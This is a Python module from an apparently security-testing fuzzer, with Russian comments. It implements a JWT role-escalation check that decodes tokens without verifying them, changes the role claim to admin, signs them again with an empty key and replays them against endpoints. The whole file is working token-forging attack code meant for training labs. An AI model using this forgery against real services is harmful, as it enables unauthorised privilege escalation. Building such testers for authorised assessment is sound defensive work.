from __future__ import annotations

from typing import List

import httpx
import jwt  # pyjwt

from fuzzer.attacks.base import AttackStrategy, AttackResult
from fuzzer.runners.storage import Endpoint, AuthContext


class JwtRoleEscalation(AttackStrategy):
    """
    Попытка эскалации привилегий путём изменения claim "role" в JWT.
    Работает только на учебных стендах, где подпись может быть некорректно проверена.
    """

    name = "jwt_role_escalation"

    def applicable(self, endpoint: Endpoint, ctx: AuthContext) -> bool:
        if not ctx.jwt_tokens:
            return False
        return endpoint.has_auth_header

    async def run(
        self,
        endpoint: Endpoint,
        ctx: AuthContext,
        client: httpx.AsyncClient,
    ) -> List[AttackResult]:
        results: List[AttackResult] = []
        url = endpoint.path

        for token in ctx.jwt_tokens:
            try:
                header = jwt.get_unverified_header(token)
                payload = jwt.decode(
                    token,
                    options={"verify_signature": False},
                )
            except Exception:
                # не удалось разобрать токен — пропускаем
                continue

            original_role = payload.get("role")
            if original_role == "admin":
                # уже админ — неинтересно
                continue

            # пытаемся задать роль admin
            payload["role"] = "admin"

            alg = header.get("alg", "HS256")
            try:
                # для учебных стендов пробуем "пустой" ключ
                forged = jwt.encode(payload, key="", algorithm=alg)
            except Exception:
                continue

            headers = dict(ctx.headers)
            headers["Authorization"] = f"Bearer {forged}"

            resp = await client.request(
                endpoint.method,
                url,
                headers=headers,
                cookies=ctx.cookies,
            )

            if resp.status_code == 200:
                results.append(
                    AttackResult(
                        vulnerability="jwt_role_escalation",
                        endpoint=f"{endpoint.method} {endpoint.path}",
                        severity="high",
                        evidence={
                            "original_role": original_role,
                            "status_code": resp.status_code,
                            "response_sample": resp.text[:512],
                        },
                    )
                )

        return results
